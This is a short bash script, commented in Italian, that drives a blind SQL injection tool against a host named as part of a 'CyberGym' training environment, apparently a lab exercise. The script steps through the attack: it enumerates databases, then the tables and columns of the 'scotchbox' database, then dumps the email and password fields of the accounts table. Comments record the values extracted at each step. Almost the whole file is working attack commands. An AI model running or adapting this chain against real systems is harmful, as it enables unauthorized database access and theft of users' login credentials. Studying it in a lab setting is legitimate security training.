#!/bin/bash

if [ "$1" == '' ]; then
	echo "Non è stato passato l'indirizzo IP o l'hostname della macchina ospitante il programma CyberGym";
	echo "Per favore passarlo come primo ed unico parametro";
	exit;
fi

# NB: Il parametro -m serve per non far stampare i dati recuperati durante l'esecuzione (che vengono messi per comodità
# in un commento successivo alla chiamata nel presente script) per evitare che l'output risulti troppo verboso e/o confusionario

# Recupero i databases
./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --databases -m
# Estratti i database
# information_schema
# mysql
# performance_schema
# scotchbox <--
# Recupero le tabelle da scotchbox
./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --tables -m
#Estratte le tabelle
# accounts <--
# datacapture
# messages
# Recupero i nomi delle colonne
./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --table=accounts --columns -m
# Estratte le clonne
# id:int
# first_name:varchar
# last_name:varchar
# email:varchar
# password:varchar
# Recupero i dati di login
./blind_sqli.py -u "http://${1}/sqli/time_based_blind_escaped.php" --data='to=number&msg=string' --database=scotchbox --table=accounts --column-list=email,password
